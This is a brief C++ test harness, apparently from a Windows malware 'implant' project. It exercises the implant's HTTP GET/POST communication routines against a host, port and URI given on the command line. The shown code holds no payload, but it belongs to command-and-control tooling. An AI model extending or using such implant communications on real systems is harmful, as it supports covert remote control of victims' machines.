#include <iostream>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include "../comms/comms.hpp"
#include "../execution/execution.hpp"
#include "../config/config.hpp"


int main(int argc, char *argv[]) {
    CONFIG config;

    if (argc != 5) {
        std::cout
            << "usage: implant.exe fqdn(no http://) port uri data"
            << std::endl;
        return 0;
    }

    // [[testing get or post]]
    std::string fqdn = std::string(argv[1]);
    int port = std::stoi(argv[2]);
    std::string uri = std::string(argv[3]);
    std::string data = std::string(argv[4]);

    std::cout << "[[uncomment get or post in the source to test each one]]\n" << std::endl;

    std::cout << get(fqdn, port, uri) << std::endl;
    // std::cout << post(fqdn, port, uri, data) << std::endl;

    return 0;
}
